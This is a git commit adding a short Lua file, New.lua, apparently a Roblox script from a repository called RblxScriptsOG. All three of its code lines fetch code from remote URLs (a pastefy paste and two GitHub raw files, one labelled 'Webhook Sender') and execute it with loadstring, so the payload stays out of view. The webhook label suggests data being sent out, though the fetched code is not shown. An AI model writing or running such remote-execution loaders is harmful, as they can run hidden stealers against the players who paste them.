65dc9d8aaed8b146bd40331fe45b73b7f3b8f601
RblxScriptsOG <faithsmiley.robloxscripts@gmail.com>
2025-07-14 20:14:35 +0500

    Update and rename Coming Soon... to New.lua

---
+++ New.lua
@@ -0,0 +1,6 @@
+-- Script
+loadstring(game:HttpGet("https://pastefy.app/bUivM5E5/raw"))()
+-- Webhook Sender
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RblxScriptsOG/Rblx.Scripts/refs/heads/main/Webhook%20Sender.lua"))()
+-- Backup
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RblxScriptsOG/Rblx.Scripts/refs/heads/main/Script.txt"))()
